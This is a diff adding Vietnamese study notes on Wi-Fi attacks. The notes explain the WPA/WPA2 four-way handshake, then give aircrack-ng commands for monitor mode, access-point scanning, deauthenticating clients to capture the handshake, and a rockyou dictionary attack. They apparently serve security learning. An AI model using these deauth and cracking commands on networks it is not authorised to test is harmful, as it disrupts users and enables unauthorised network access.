@@ -26,7 +26,60 @@ Nó như 1 cầu nối giữa thiết bị và mạng. Nó sẽ gửi những pa
 3. Mbit rate
 4. Những channel trong network nào đang hoạt động
 
+> WPA/WPA2 4ways-handshake
+
+Có 2 thứ diễn ra trong quá trình này:
+1. Client và AP sẽ trao đổi in4 thông qua 1 kết nối an toàn
+2. Quá trình handshake này cần dữ liệu được mã hóa để verified PSK (Pre-Shared key)
+
+Qúa trình này cần thiết trong dictionary attack = cách bắt nó reconnect, ta sẽ có được 4ways-handshake <br>
+chưa nhiều thông tin của connection
+
 ## Discovering network
+
+Turn on monitor mode của wifi apdapter
+
+```
+sudo airmon-ng wlan0 start
+```
+
+Nhưng trước khi bật monitor mode, mik cần phải bật airmon-check <br>
+để xem cần kill những process nào
+
+```
+sudo airmon-ng check
+```
+
+Sau đó thực hiện bắt tất cả các AP (Access Pointer)
+
+```
+sudo airodump-ng <interface>
+```
+#### Elements ở trong bảng recon network
+![image](https://github.com/user-attachments/assets/7b841beb-9466-49ea-ade4-4b148cdae93b)
+
+ý nghĩa của từng elements:
+
+![image](https://github.com/user-attachments/assets/995af50a-18ce-4dc5-ac19-400f22179ee4)
+
+***Nhiều BSSID có cùng ESSI là do chúng share cùng 1 cục ra nhiều địa điểm khác nhau <br>
+để mở rộng bandwidth***
+
+## Dictionary Attack
+
+***Tấn công = thử tất cả các password của 1 lists***
+
+1. Bật monitor mode của wifi adapter
+2. Dictionary attack required WPA-handshake nên mik sẽ cần bắt những packets đến AP
+  ```
+  sudo aireplay-ng --deauth <# packets> -a <BSSID> -c <CLIENT-MAC> wlan0mon
+  ```
+3. Tải rock_you.txt
+  
+4. Attack Command
+  ```
+  sudo aircrack-ng -w <dictionary_file> -b <BSSID> <capture_file>.cap
+  ```
 
 # Event Viewer
 ![image](https://github.com/user-attachments/assets/193d98d7-89db-4e70-b341-788858c64224)
